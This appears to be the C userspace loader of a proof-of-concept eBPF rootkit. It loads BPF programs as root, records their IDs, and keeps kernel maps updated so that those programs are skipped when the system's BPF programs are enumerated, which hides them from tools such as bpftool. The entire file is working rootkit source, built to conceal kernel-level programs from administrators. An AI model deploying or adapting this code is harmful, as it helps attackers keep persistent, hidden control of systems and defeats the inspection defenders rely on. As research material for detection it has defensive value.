// SPDX-License-Identifier: GPL-2.0
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/resource.h>
#include <linux/bpf.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include "rootkit.h"

#define END_OF_LIST 0xFFFFFFFF
#define INITIAL_SYSTEM_PROGS_CAPACITY 256
#define MAX_OWN_PROGS 1024

static volatile sig_atomic_t stop = 0;
static int hiding_map_fd = -1;
static int jump_trigger_map_fd = -1;
static struct ring_buffer *ringbuf = NULL;

static __u32 own_prog_ids[MAX_OWN_PROGS];
static int own_prog_len = 0;

static __u32 *system_progs = NULL; // Dynamic array of all the running BPF programs on system
static int system_prog_len = 0;
static int system_prog_capacity = INITIAL_SYSTEM_PROGS_CAPACITY;

static void stop_sig_handler(int sig) { stop = 1; }

static int resize_system_progs(void)
{
    system_prog_capacity *= 2;
    __u32 *new_progs = realloc(system_progs, system_prog_capacity * sizeof(__u32));
    if (!new_progs) {
        perror("Failed to resize system_progs array");
        return -1;
    }
    system_progs = new_progs;
    return 0;
}

static int refresh_bpf_program_mapping(void)
{
    __u32 id = 0;
    int prog_len = 0;
    
    while (bpf_prog_get_next_id(id, &id) == 0) {
        if (prog_len >= system_prog_capacity && resize_system_progs() != 0)
            return prog_len;
        system_progs[prog_len++] = id;
    }
    return prog_len;
}

static int is_hidden(__u32 prog_id)
{
    for (int i = 0; i < own_prog_len; i++) {
        if (own_prog_ids[i] == prog_id)
            return 1;
    }
    return 0;
}

static void clear_bpf_map(int map_fd)
{
    __u32 key = 0, next_key;
    while (bpf_map_get_next_key(map_fd, &key, &next_key) == 0) {
        bpf_map_delete_elem(map_fd, &next_key);
        key = next_key;
    }
}

static __u32 find_next_visible_program(int start_index)
{
    for (int i = start_index + 1; i < system_prog_len; i++) {
        if (!is_hidden(system_progs[i]))
            return system_progs[i];
    }
    return END_OF_LIST;
}

static __u32 find_last_visible_program(void)
{
    for (int i = system_prog_len - 1; i >= 0; i--) {
        if (!is_hidden(system_progs[i]))
            return system_progs[i];
    }
    return 0;
}

static __u32 find_last_hidden_program(void)
{
    for (int i = system_prog_len - 1; i >= 0; i--) {
        if (is_hidden(system_progs[i])) {
            return system_progs[i];
        }
    }
    return 0;
}

static void update_program_hiding_map(void)
{
    printf("[*] Recalculating hiding map...\n");
    
    clear_bpf_map(hiding_map_fd);
    clear_bpf_map(jump_trigger_map_fd);

    system_prog_len = refresh_bpf_program_mapping();
    printf("[*] System has %d programs: ", system_prog_len);
    for (int i = 0; i < system_prog_len; i++) printf("%u ", system_progs[i]);
    printf("\n");
    
    __u32 last_visible = find_last_visible_program();
    __u32 last_hidden = find_last_hidden_program();
    
    for (int i = 0; i < system_prog_len; i++) {
        __u32 current = system_progs[i];
        
        if (is_hidden(current)) {
            __u32 next_valid = find_next_visible_program(i);
            
            if (next_valid != END_OF_LIST) {
                // Normal case: visible program exists after this hidden one
                bpf_map_update_elem(hiding_map_fd, &current, &next_valid, BPF_ANY);
                printf("[+] Hiding %u -> %u\n", current, next_valid);
            } else {
                // Our programs are last - set jump trigger once and exit
                printf("[+] Hiding %u (end of list)\n", current);
                if (last_hidden > 0) {
                    __u32 trigger_id = (last_visible > 0) ? last_visible : 0;
                    bpf_map_update_elem(jump_trigger_map_fd, &trigger_id, &last_hidden, BPF_ANY);
                    printf("[+] Jump trigger: %u -> %u (causes ENOENT)\n", trigger_id, last_hidden);
                }
                break;
            }
        }
    }
}

static struct bpf_link *load_and_hide_program(struct bpf_object *obj, const char *prog_name)
{
    struct bpf_program *prog = bpf_object__find_program_by_name(obj, prog_name);
    if (!prog) {
        perror("Failed to find program");
        return NULL;
    }
    
    struct bpf_link *link = bpf_program__attach(prog);
    if (!link) {
        perror("Failed to attach program");
        return NULL;
    }
    
    struct bpf_prog_info info = {};
    __u32 info_len = sizeof(info);
    bpf_obj_get_info_by_fd(bpf_program__fd(prog), &info, &info_len);
    
    own_prog_ids[own_prog_len++] = info.id;
    printf("[+] %s ID: %u\n", prog_name, info.id);
    
    return link;
}

static int handle_event(void *ctx, void *data, size_t data_sz)
{
    const struct event_data *evt = data;
    
    if (evt->action == ACTION_LOAD)
        printf("\n[!] BPF program loaded, recalculating...\n");
    else if (evt->action == ACTION_UNLOAD)
        printf("\n[!] BPF program unloaded, recalculating...\n");
    
    update_program_hiding_map();
    return 0;
}

static void ensure_program_in_ram(void)
{
    struct rlimit rlim = { RLIM_INFINITY, RLIM_INFINITY };
    setrlimit(RLIMIT_MEMLOCK, &rlim);
}

int main(int argc, char **argv)
{
    if (geteuid() != 0) {
        perror("Must run as root");
        return 1;
    }
    system_progs = malloc(INITIAL_SYSTEM_PROGS_CAPACITY * sizeof(__u32));
    if (!system_progs) {
        perror("Failed to allocate memory for system_progs");
        return 1;
    }

    ensure_program_in_ram();

    signal(SIGINT, stop_sig_handler);
    signal(SIGTERM, stop_sig_handler);
    
    printf("=== eBPF Rootkit PoC ===\n\n");
    
    struct bpf_object *obj = bpf_object__open_file("rootkit.bpf.o", NULL);
    if (!obj) {
        perror("Failed to open BPF object");
        return 1;
    }
    if (bpf_object__load(obj) != 0) {
        perror("Failed to load BPF object");
        bpf_object__close(obj);
        return 1;
    }
    
    struct bpf_link *link1 = load_and_hide_program(obj, "auditor_entry");
    struct bpf_link *link2 = load_and_hide_program(obj, "changer_exit");
    struct bpf_link *link3 = load_and_hide_program(obj, "detect_unload");
    
    if (!link1 || !link2) {
        fprintf(stderr, "Failed to attach core BPF programs\n");
        bpf_object__close(obj);
        free(system_progs);
        return 1;
    }
    
    if (!link3) {
        fprintf(stderr, "\n[ERROR] Failed to attach to bpf_prog_put kprobe!\n This kernel does not support hooking bpf_prog_put.\n");
        bpf_object__close(obj);
        free(system_progs);
        return 1;
    }
    
    hiding_map_fd = bpf_map__fd(bpf_object__find_map_by_name(obj, "hiding_map"));
    jump_trigger_map_fd = bpf_map__fd(bpf_object__find_map_by_name(obj, "jump_trigger_map"));
    int ringbuf_fd = bpf_map__fd(bpf_object__find_map_by_name(obj, "event_ringbuf"));
    
    ringbuf = ring_buffer__new(ringbuf_fd, handle_event, NULL, NULL); // Creates a userspace polling interface for ring buffer 
    if (!ringbuf) {
        perror("Failed to create ring buffer");
        bpf_object__close(obj);
        free(system_progs);
        return 1;
    }
    
    update_program_hiding_map();
    printf("\n[*] Rootkit active, Ctrl+C to exit\n");
    printf("[*] Test with: bpftool prog list\n\n");
    
    while (!stop)
        ring_buffer__poll(ringbuf, 1000); // Wakes up every second to check if the user exited the program Ctrl+C
    
    printf("\n[*] Exiting...\n");
    ring_buffer__free(ringbuf);
    bpf_link__destroy(link1);
    bpf_link__destroy(link2);
    bpf_link__destroy(link3);
    bpf_object__close(obj);
    free(system_progs);
    return 0;
}
